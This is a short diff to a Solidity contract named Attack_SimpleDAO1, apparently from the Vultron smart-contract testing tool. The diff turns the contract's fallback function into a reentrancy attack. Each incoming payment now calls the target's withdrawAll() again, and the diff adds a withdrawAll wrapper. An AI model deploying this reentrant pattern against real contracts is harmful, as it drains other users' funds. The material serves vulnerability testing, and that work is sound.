@@ -1,6 +1,6 @@
-pragma solidity>=0.4.19;
+pragma solidity ^0.4.19;
 
-import "./SimpleDAO.sol";
+import "/home/hjwang/Tools/vultron/contracts/SimpleDAO.sol";
 
 contract Attack_SimpleDAO1 {
 
@@ -10,12 +10,12 @@ contract Attack_SimpleDAO1 {
       target_contract = SimpleDAO(_targetContract);
   } 
 
-  function vultron_vultron_reset(address user) public {
-    target_contract.vultron_reset(user);
-  } 
-
   function vultron_withdraw(uint256 amount) public {
     target_contract.withdraw(amount);
+  } 
+
+  function vultron_withdrawAll() public {
+    target_contract.withdrawAll();
   } 
 
   function vultron_donate(uint256 vultron_amount, address to) public payable{
@@ -23,6 +23,6 @@ contract Attack_SimpleDAO1 {
   } 
 
   function() public payable {
-    revert();
+    target_contract.withdrawAll();
   }
 } 
